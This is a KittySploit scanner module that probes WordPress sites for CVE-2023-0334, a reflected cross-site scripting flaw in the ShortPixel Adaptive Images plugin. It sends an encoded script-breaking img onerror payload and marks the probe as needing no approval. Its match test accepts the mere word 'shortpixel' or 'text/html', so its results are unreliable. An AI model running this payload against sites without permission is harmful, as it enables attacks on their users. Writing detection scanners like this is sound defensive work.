#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflec."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ShortPixel Adaptive Images < 3.6.3 - Cross Site Scripting Detection',
        'description': 'The plugin does not sanitise and escape a parameter before outputting it back in the page, leading to a Reflected Cross-Site Scripting which could be used against any high privilege users such as admin',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'xss', 'wpscan', 'wordpress', 'wp-plugin', 'wp', 'shortpixel-adaptive-images', 'shortpixel', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/b027a8db-0fd6-444d-b14a-0ae58f04f931',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-0334',
        ],
        'cve': 'CVE-2023-0334',
    }

    def run(self):
        r = self.http_request(method="GET", path='/?SPAI_VJS=%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html', 'shortpixel', '</script><img src=1 onerror=alert(document.domain)>',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='medium',
                reason="ShortPixel Adaptive Images < 3.6.3 - Cross Site Scripting detected",
                path='/?SPAI_VJS=%3C/script%3E%3Cimg%20src%3D1%20onerror%3Dalert(document.domain)%3E',
            )
            return True
        return False

